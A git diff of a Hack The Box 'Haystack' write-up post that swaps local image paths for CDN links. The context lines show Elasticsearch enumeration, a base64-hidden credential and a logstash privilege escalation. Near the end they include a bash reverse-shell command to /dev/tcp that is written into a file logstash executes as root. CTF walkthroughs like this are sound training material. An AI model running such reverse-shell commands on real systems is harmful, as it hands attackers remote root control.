@@ -2,14 +2,14 @@
 title: "Haystack - hack the box"
 author: Neal
 summary: "本文围绕《Haystack - hack the box》展开，重点梳理Introduction、Information Enumeration和Exploit等内容，提炼背景、思路与实践注意点。"
-cover: "/img/post-covers/haystack-4f12b9fac4.jpg"
+cover: "https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/optimized/covers/dd38fb2904838b2e03ec.webp"
 keywords: [HTB,hack the box,ELK,elasticsearch,logstash,kibana,CVE]
 tags: [安全, 渗透测试, HTB]
 categories: [靶机]
 date: "2019-11-30"
 ---
 
-![eyER9x.png](/img/content/edb5c8933ce1.webp)
+![eyER9x.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/optimized/content/493429198c2d3ffdf4d3.webp)
 
 ## Introduction
 
@@ -57,11 +57,11 @@ PORT     STATE SERVICE VERSION
 
 For port 80, we find nothing except a picture of a needle. Exiftool is used to analyze. But nothing interesting found. Try to use gobuster to brute force the directory, but have not found any useful directories.
 
-![eyER9x.png](/img/content/edb5c8933ce1.webp)
+![eyER9x.png](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/optimized/content/493429198c2d3ffdf4d3.webp)
 
 For port 9200, nmap seems to be failed to detect. But this port should be familiar to elasticserarch users. Elasticsearch is a popular search database in recent years. Something is interesting in elasticsearch. We will talk about this later.
 
-![Haystack 端口探测](/img/content/csdn-f4ed619d4f8feff64ab001a40b7a7bdc.webp)
+![Haystack 端口探测](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/optimized/content/560b74c76fc95e416f34.webp)
 
 ## Exploit
 
@@ -119,7 +119,7 @@ This key cannot be lost, I keep it here: cGFzczogc3BhbmlzaC5pcy5rZXk=
 
 The end of the strings is encoded by base64. When decoded, we can find the username and password. Then you can ssh by the username and password. 
 
-![Haystack 凭据](/img/content/csdn-4564c0c6a02f43fe31211c6a6fbc6278.webp)
+![Haystack 凭据](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/optimized/content/25b6ade029b4fbf45236.webp)
 
 To be honest, I don't like the user of the box. But it does works as the keyword: you have to find a needle in haystack.
 
@@ -169,7 +169,7 @@ Connection: close
 
 Wait for a while, then we are kibana.
 
-![Kibana 利用结果](/img/content/csdn-35408c5fbd6654dd2b94b951648346bb.webp)
+![Kibana 利用结果](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/optimized/content/0963ca49d4c70457df07.webp)
 
 But we are still not root! Don't be upset. Let's move on. If we look at the logstash in the machine carefully, we will find something interesting. We find the user group `kibana` has write permission of `conf.d` of logstash.
 
@@ -192,7 +192,7 @@ drwxrwxr-x.  2 root   kibana   62 jun 24 08:12 conf.d
 
 So the exploit is very clear. Create a file in `/opt/kibana/` whose name begins with `logstah_`. And make sure the content in the file can be parsed by grok correctly. Then the command can be executed successfully. The most important part is how to create the content to be parsed to correct `comando`. So you should know how to use grok. Grok is utilized to recognize specific fields by the regular expression. [Grok Debugger] is a useful tool to test grok online.
 
-![Grok Debugger](/img/content/csdn-33fc778ae18696a0ec2c046bf7d466b3.webp)
+![Grok Debugger](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/optimized/content/4c50d5e23c58e0043ce3.webp)
 
 The expression is quite simple. If you know the regular expression, it will not be hard to understand the expression here.
 
@@ -244,4 +244,4 @@ echo "Ejecutar  comando: bash -i >& /dev/tcp/10.10.16.61/1234 0>&1" > /opt/kiban
 
 Use the nc to listen at port 1234, wait a while, root is coming.
 
-![Haystack root shell](/img/content/csdn-21f3180265c1cece4b3e924e08702b15.webp)
+![Haystack root shell](https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/optimized/content/befd22cc57e457934e65.webp)
